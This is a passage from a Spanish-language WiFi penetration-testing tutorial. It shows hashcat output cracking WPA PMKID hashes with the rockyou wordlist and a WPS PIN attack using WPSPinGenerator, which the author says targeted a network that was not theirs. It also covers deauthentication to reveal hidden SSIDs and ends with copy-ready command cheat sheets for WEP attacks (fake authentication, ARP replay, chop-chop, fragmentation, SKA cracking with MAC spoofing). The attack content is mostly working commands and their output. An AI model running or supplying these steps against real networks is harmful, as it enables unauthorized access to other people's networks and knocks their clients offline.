* Filename..: rockyou.txt
* Passwords.: 14344387
* Bytes.....: 139921538
* Keyspace..: 14344387

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Type........: WPA-PMKID-PBKDF2
Hash.Target......: myHashes
Time.Started.....: Mon Aug 12 22:48:04 2019 (3 secs)
Time.Estimated...: Mon Aug 12 22:53:08 2019 (5 mins, 1 sec)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    93064 H/s (55.72ms) @ Accel:512 Loops:128 Thr:64 Vec:1
Recovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts
Progress.........: 610384/28688774 (2.13%)
Rejected.........: 446544/610384 (73.16%)
Restore.Point....: 0/14344387 (0.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:3712-3840
Candidates.#1....: 123456789 -> sunflower15
Hardware.Mon.#1..: Temp: 64c Util: 99% Core:1670MHz Mem:3504MHz Bus:8

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Type........: WPA-PMKID-PBKDF2
Hash.Target......: myHashes
Time.Started.....: Mon Aug 12 22:48:04 2019 (7 secs)
Time.Estimated...: Mon Aug 12 22:53:09 2019 (4 mins, 58 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    91919 H/s (55.94ms) @ Accel:512 Loops:128 Thr:64 Vec:1
Recovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts
Progress.........: 1292574/28688774 (4.51%)
Rejected.........: 801054/1292574 (61.97%)
Restore.Point....: 387112/14344387 (2.70%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:3840-3968
Candidates.#1....: sunflower11 -> 22lovers
Hardware.Mon.#1..: Temp: 66c Util:100% Core:1657MHz Mem:3504MHz Bus:8

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => 
```

En mi caso, tiro de **GPU** y os puedo decir que el tiempo total para cracker estos hashes es de 5 minutos.
(Aunque tambiÃ©n se puede ver en el output anterior).

Se podrÃ­a decir que es una gozada, porque nos estamos olvidando tanto de **aircrack** como de **aireplay**, de
**airodump**, **pyrit**, **airolib**, **cowpatty**, **genpmk**, etc.

Una vez crackeada la contraseÃ±a, esta es mostrada:

```bash
[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Type........: WPA-PMKID-PBKDF2
Hash.Target......: myHashes
Time.Started.....: Mon Aug 12 22:48:04 2019 (1 min, 51 secs)
Time.Estimated...: Mon Aug 12 22:52:25 2019 (2 mins, 30 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    89458 H/s (57.26ms) @ Accel:512 Loops:128 Thr:64 Vec:1
Recovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts
Progress.........: 15218868/28688774 (53.05%)
Rejected.........: 5388468/15218868 (35.41%)
Restore.Point....: 7545850/14344387 (52.60%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2816-2944
Candidates.#1....: horneybabe1987 -> groovejet
Hardware.Mon.#1..: Temp: 86c Util: 99% Core:1632MHz Mem:3504MHz Bus:8

Approaching final keyspace - workload adjusted.  

2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737:KqpsEFunpXXXXXXXXX
                                                 
Session..........: hashcat
Status...........: Exhausted
Hash.Type........: WPA-PMKID-PBKDF2
Hash.Target......: myHashes
Time.Started.....: Mon Aug 12 22:48:04 2019 (3 mins, 36 secs)
Time.Estimated...: Mon Aug 12 22:51:40 2019 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    88906 H/s (47.34ms) @ Accel:512 Loops:128 Thr:64 Vec:1
Recovered........: 1/2 (50.00%) Digests, 1/2 (50.00%) Salts
Progress.........: 28688774/28688774 (100.00%)
Rejected.........: 9469826/28688774 (33.01%)
Restore.Point....: 14344387/14344387 (100.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 0133112024erdalk -> KqpsEFunpo7w29nrbx4H
Hardware.Mon.#1..: Temp: 88c Util: 99% Core:1632MHz Mem:3504MHz Bus:8

Started: Mon Aug 12 22:48:02 2019
Stopped: Mon Aug 12 22:51:42 2019
```

O tambiÃ©n:

```bash
â”Œâ”€[root@parrot]â”€[/usr/share/wordlists]
â””â”€â”€â•¼ #cat myHashes 
0d4191730a005481706436bdbc50919c*fcb4e699a909*b0febdab6d9d*4d4f5649535441525f41393038
2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737
â”Œâ”€[root@parrot]â”€[/usr/share/wordlists]
â””â”€â”€â•¼ #hashcat -m 16800 --show myHashes 
2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737:KqpsEFunpXXXXXXXXXXXXX
```

### Ataques por WPS

Ya como casi Ãºltimo de los puntos a tratar para redes de protocolo **WPA/WPA2**, no puedo acabar la secciÃ³n
sin mencionar el famoso **WPS**.

Desde mi experiencia, os podrÃ­a estar comentando ahora mismo cÃ³mo usar **pixiedust**, **reaver** o derivados,
pero prefiero mostraros herramientas de utilidad que realmente den resultados, o que por lo menos tengan una
tasa de Ã©xito mÃ¡s probable.

#### Uso de WPSPinGenerator

Si os fijÃ¡is, en todo el **Gist**, hemos hecho la gran parte de procedimientos a mano, me refiero, sin hacer
uso de herramientas automatizadas. No suelo acostumbrar a hacer uso de herramientas que te automatizan un
procedimiento, sobre todo por la curiosidad que me causa el cÃ³mo funciona esa por debajo. Sin embargo, para
este caso, hay una de ellas especialmente destinadas a **WPS** que sÃ­ que utilizo, por la gran tasa de acierto
de la que dispone.

El sistema operativo **Wifislax**, se podrÃ­a decir que es un sistema operativo orientado al Hacking y
AuditorÃ­a WiFi. Cuenta con bastantes herramientas de automatizaciÃ³n como Fluxion, Linset o Wifimosys que
automatizan todo lo que nosotros hemos estado haciendo a mano. Es un OS principalmente orientados a **Script
Kiddies**.

Una de las herramientas de **Wifislax** que uso con bastante frecuencia es **WPSPinGenerator**, por no decir
que es la Ãºnica herramienta que utilizo de este OS. Â¿QuÃ© nos permite hacer **WPSPinGenerator**?, veÃ¡moslo con un ejemplo prÃ¡ctico.

Al principio, es necesario seleccionar la interfaz de red con la que trabajar, especificar los canales sobre
los cual queremos escanear, en fin... lo tÃ­pico. Esta parte me la saltarÃ©.

Una vez escaneamos las redes disponibles de nuestro entorno, vemos algo como esto:

<img align="center" src="https://funkyimg.com/i/2Wc39.png">

Si nos fijamos, vemos que para cada red inalÃ¡mbrica, se nos dice si esta cuenta o no con un PIN genÃ©rico.
(Recomiendo que leas cÃ³mo funciona la asociaciÃ³n a travÃ©s de PIN).

Una vez seleccionamos la red, fijaros que interesante:

<img align="center" src="https://funkyimg.com/i/2Wc3a.png">

Nos lista los posibles PINES para esa red. Generalmente, a los 3 intentos, el router bloquea el WPS para que
no se puedan enviar mÃ¡s solicitudes. Sin embargo, a veces en vez de ser 5 pines, la herramienta nos reporta 2,
o incluso 1.

Para este caso, que son 5, el PIN correcto estaba en la primera posiciÃ³n (no es mi red), y tras seleccionar la
opciÃ³n **2**, obtenemos los siguientes resultados:

<img align="center" src="https://funkyimg.com/i/2Wc3g.png">

La contraseÃ±a de la red inalÃ¡mbrica en texto claro directamente. Por si no la ves bien:

<img align="center" src="https://funkyimg.com/i/2Wc3q.png">

Â¿Lo bueno de esto?, que no importa cuantas veces cambies la contraseÃ±a... pues si el PIN sigue siendo el mismo
para la eternidad, como atacantes siempre vamos a ser capaces de verla en cuestiÃ³n de segundos,
independientemente de su longitud o robustez.

### Redes WPA Ocultas

Ya para acabar este Gist, os cito una tÃ©cnica para redes WPA que estÃ¡n configuradas como ocultas.

Generalmente, desde **aircrack**, se listan las redes ocultas de esta forma:

`<length: 0>`

Â¿QuÃ© hacemos en este caso cuando la red estÃ¡ oculta?, bueno, sabemos que a nivel de filtrado no vamos a tener
problema... pues filtramos por la **BSSID** y problema resuelto. Sin embargo, hay un pequeÃ±o fallo de esta
configuraciÃ³n que nos permite dar con la **ESSID** del AP.

Si efecutamos un ataque de de-autenticaciÃ³n global para expulsar a todos los clientes (o dirigido en caso de
que haya sÃ³lo uno), cuando estos tratan de re-asociarse al AP, uno de los paquetes que mandan ya hemos visto que son los **Probe Request**:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==4" 2>/dev/null
   59 3.094674701 HonHaiPr_17:91:c0 â†’ Broadcast    802.11 240 Probe Request, SN=1378, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
   63 3.304134536 HonHaiPr_17:91:c0 â†’ Broadcast    802.11 240 Probe Request, SN=1379, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
   98 4.671950803 Apple_48:66:14 â†’ Broadcast    802.11 213 Probe Request, SN=1113, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  100 4.682076898 Apple_48:66:14 â†’ Broadcast    802.11 213 Probe Request, SN=1114, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
```

Perfecto, pues de estos paquetes, siempre el primero emitido antes de empezar con la fase de asociaciÃ³n emite
por defecto el **ESSID** de la red en texto claro, de manera no oculta y transparente para el atacante.

De esta forma, podemos ser capaces de extraer el **ESSID** de la red tras aplicar un ataque de
de-autenticaciÃ³n sobre una de las estaciones presentes. Â¿Pero quÃ© es lo bueno de esto?, que ni nosotros
tenemos que hacer el trabajo. Una vez la propia suite de **aircrack** detecta estos paquetes Probe, los parsea
en busca del **ESSID** de la red oculta. En caso de obtenerla, sustituye el campo `<length: 0>` por el **ESSID** descubierto, automÃ¡ticamente.

## Redes WEP

**IMPORTANTE: En este punto, no entrarÃ© tanto al detalle como en las redes de protocolo WPA. Â¿Por quÃ©?, porque
ya para eso tienes todo el material necesario que te entregan tras cursar la certificaciÃ³n, que se orienta a
vulnerar el protocolo WEP. Todo lo visto hasta ahora, han sido tÃ©cnicas que os querÃ­a compartir sobre el
protocolo WPA/WPA2, ya que es el mÃ¡s usado a dÃ­a de hoy y el que con mÃ¡s frecuencia nos vamos a encontrar en nuestro entorno.**

AÃºn asÃ­, dejo un **Cheat Sheet** para cada uno de los casos.

### Fake Authentication Attack

```bash
s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng â€“c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
# Identificamos nuestra MAC
s4vitar@parrot:~# macchanger --show wlan0mon
s4vitar@parrot:~# aireplay-ng -1 0 -a <BSSID> -h <nuestraMAC> -e <ESSID> wlan0mon
s4vitar@parrot:~# aireplay-ng -2 â€“p 0841 â€“c FF:FF:FF:FF:FF:FF â€“b <BSSID> -h <nuestraMAC> wlan0mon
s4vitar@parrot:~# aircrack-ng â€“b <BSSID> <archivoPCAP>
```

### ARP Replay Attack

```bash
s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng â€“c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
# Identificamos nuestra MAC
s4vitar@parrot:~# macchanger --show wlan0mon
s4vitar@parrot:~# aireplay-ng -3 â€“x 1000 â€“n 1000 â€“b <BSSID> -h <nuestraMAC> wlan0mon
s4vitar@parrot:~# aircrack-ng â€“b <BSSID> <archivoPCAP>
```

### Chop Chop Attack

```bash
s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng â€“c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
# Identificamos nuestra MAC
s4vitar@parrot:~# macchanger --show wlan0mon
s4vitar@parrot:~# aireplay-ng -1 0 â€“e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
s4vitar@parrot:~# aireplay-ng -4 â€“b <BSSID> -h <nuestraMAC> wlan0mon
 # Presionamos â€˜yâ€™ ;
s4vitar@parrot:~# packetforge-ng -0 â€“a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
s4vitar@parrot:~# aireplay-ng -2 â€“r <FileName2> wlan0mon
s4vitar@parrot:~# aircrack-ng <archivoPCAP>
```

### Fragmentation Attack

```bash
s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng â€“c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
# Identificamos nuestra MAC
s4vitar@parrot:~# macchanger --show wlan0mon
s4vitar@parrot:~# aireplay-ng -1 0 â€“e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
s4vitar@parrot:~# aireplay-ng -5 â€“b<BSSID> -h <nuestraMAC > wlan0mon
# Presionamos â€˜yâ€™ ;
s4vitar@parrot:~# packetforge-ng -0 â€“a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
s4vitar@parrot:~# aireplay-ng -2 â€“r <FileName2> wlan0mon
s4vitar@parrot:~# aircrack-ng <archivoPCAP>
```

### SKA Type Cracking

```bash
s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng â€“c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
s4vitar@parrot:~# aireplay-ng -0 10 â€“a <BSSID> -c <macVictima> wlan0mon
s4vitar@parrot:~# ifconfig wlan0mon down
s4vitar@parrot:~# macchanger â€“-mac <macVictima> wlan0mon
s4vitar@parrot:~# ifconfig wlan0mon up
s4vitar@parrot:~# aireplay-ng -3 â€“b <BSSID> -h <macFalsa> wlan0mon
s4vitar@parrot:~# aireplay-ng â€“-deauth 1 â€“a <BSSID> -h <macFalsa> wlan0mon
s4vitar@parrot:~# aircrack-ng <archivoPCAP>
```
